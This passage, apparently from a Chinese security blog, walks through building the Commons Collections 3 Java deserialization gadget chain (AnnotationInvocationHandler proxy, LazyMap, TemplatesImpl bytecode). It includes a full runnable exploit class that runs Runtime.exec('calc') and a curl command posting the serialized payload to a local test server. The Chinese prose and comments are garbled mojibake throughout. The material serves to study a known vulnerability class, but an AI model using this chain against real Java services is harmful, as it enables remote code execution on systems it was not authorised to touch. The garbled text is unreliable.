<p>å¦‚æœæˆ‘ä»¬ç”¨<code>AnnotationInvocationHandler</code>ä»£ç†ç±»åŠ¨æ€ç”Ÿæˆä¸€ä¸ªä»£ç†Aï¼Œå†å»è®¿é—®ä»£ç†Açš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªåŠ¨callåˆ°ä»£ç†ç±»<code>AnnotationInvocationHandlers</code>ä¸­çš„<code>invoke()</code>æ–¹æ³•äº†</p>
<p>å¦‚æœè¿™ä¸ªä»£ç†Aæ˜¯ä¸€ä¸ªHashMapï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰§è¡Œäº†è¿™ä¸ªåˆ›å»ºçš„ä»£ç†HashMapçš„ä»»æ„ä¸€ä¸ªfunctionï¼Œéƒ½èƒ½è§¦å‘å‘½ä»¤ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åˆ›å»ºä»£ç†ç±»çš„å®ä¾‹</span>
<span class="token class-name">InvocationHandler</span> <span class="token class-name">InvocationHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//åˆ›å»ºhashmapçš„åŠ¨æ€ä»£ç†instanceï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦call åˆ°evilMapçš„ä»»æ„functionå°±å¯ä»¥è§¦å‘ä»£ç†ç±»çš„invokeäº†</span>
<span class="token class-name">Map</span> testMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> evilMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="ååºåˆ—åŒ–ç‚¹"><a href="#ååºåˆ—åŒ–ç‚¹" class="headerlink" title="ååºåˆ—åŒ–ç‚¹"></a>ååºåˆ—åŒ–ç‚¹</h4><p>æˆ‘ä»¬æ³¨æ„åˆ°<code>AnnotationInvocationHandler</code>æœ‰å®ƒè‡ªå·±çš„<code>readObject()</code>ï¼Œè¿™æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬æŠŠå®ƒä½œä¸ºåºåˆ—åŒ–objectä¼ ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨åœ¨ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œå…¶<code>readObject()</code>æ–¹æ³•ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201161957159.png" alt="image-20211201161957159" loading="lazy"></p>
<p>ç»è¿‡åˆ†æï¼Œæˆ‘ä»¬éå¸¸æ¸…æ¥šï¼Œ<code>memberValues</code>æ˜¯å¯æ§çš„ï¼Œå¯ä»¥é€šè¿‡åå°„æ„é€ å‡½æ•°æ¥æ§åˆ¶ã€‚å¦‚æœæˆ‘ä»¬å°†<code>memberValues</code>è®¾ç½®ä¸ºæˆ‘ä»¬ä¸Šä¸€æ­¥ç”Ÿæˆçš„ä»£ç†<code>evilMap</code>ï¼Œé‚£ä¹ˆæ„å‘³ç€ï¼Œååºåˆ—åŒ–æ—¶æˆ‘ä»¬å°±å¯ä»¥å®Œæˆæ•´æ¡æ”»å‡»é“¾äº†ï¼</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åˆ›å»ºä»£ç†ç±»çš„å®ä¾‹</span>
<span class="token class-name">InvocationHandler</span> <span class="token class-name">InvocationHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//åˆ›å»ºhashmapçš„åŠ¨æ€ä»£ç†instanceï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦call åˆ°evilMapçš„ä»»æ„functionå°±å¯ä»¥è§¦å‘ä»£ç†ç±»çš„invokeäº†</span>
<span class="token class-name">Map</span> testMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> evilMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//åˆ›å»ºç¬¬äºŒä¸ªä»£ç†ç±»çš„å®ä¾‹</span>
<span class="token class-name">InvocationHandler</span> anotherInvocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* å†™å‡ºåºåˆ—åŒ–æ–‡ä»¶ */</span>
<span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"test.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>anotherInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨webç¯å¢ƒå®éªŒä¸€ä¸‹:<code>curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @test.ser</code></p>
<p>è®¡ç®—å™¨æˆåŠŸå¼¹å‡º</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201162910487.png" alt="image-20211201162910487" loading="lazy"></p>
<h3 id="Payloadæ„é€ -2"><a href="#Payloadæ„é€ -2" class="headerlink" title="Payloadæ„é€ "></a>Payloadæ„é€ </h3><h4 id="æ–¹æ³•ä¸€-InvokerTransformer"><a href="#æ–¹æ³•ä¸€-InvokerTransformer" class="headerlink" title="æ–¹æ³•ä¸€ InvokerTransformer"></a>æ–¹æ³•ä¸€ InvokerTransformer</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections3</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/* ç”Ÿæˆå­—èŠ‚ç  */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡CtClass.makeClassInitializeræ–¹æ³•åœ¨å½“å‰ç±»åˆ›å»ºäº†ä¸€ä¸ªé™æ€ä»£ç å—</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¿…é¡»è¦ç»§æ‰¿AbstractTransletç±»</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å­—èŠ‚ç </span>
        <span class="token comment">/* TemplatesImplåŠ è½½å­—èŠ‚ç  */</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªtemplateså¯¹è±¡</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>classBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Class</span> trAXFilterClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>trAXFilterClass<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">)</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> classToSerialize <span class="token operator">=</span> <span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classToSerialize<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//åˆ›å»ºä»£ç†ç±»çš„å®ä¾‹</span>
        <span class="token class-name">InvocationHandler</span> <span class="token class-name">InvocationHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åˆ›å»ºhashmapçš„åŠ¨æ€ä»£ç†instanceï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦call åˆ°evilMapçš„ä»»æ„functionå°±å¯ä»¥è§¦å‘ä»£ç†ç±»çš„invokeäº†</span>
        <span class="token class-name">Map</span> testMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> evilMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åˆ›å»ºç¬¬äºŒä¸ªä»£ç†ç±»çš„å®ä¾‹</span>
        <span class="token class-name">InvocationHandler</span> anotherInvocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* å†™å‡ºåºåˆ—åŒ–æ–‡ä»¶ */</span>
        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"test.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>anotherInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Field</span> <span class="token function">getField</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> field<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
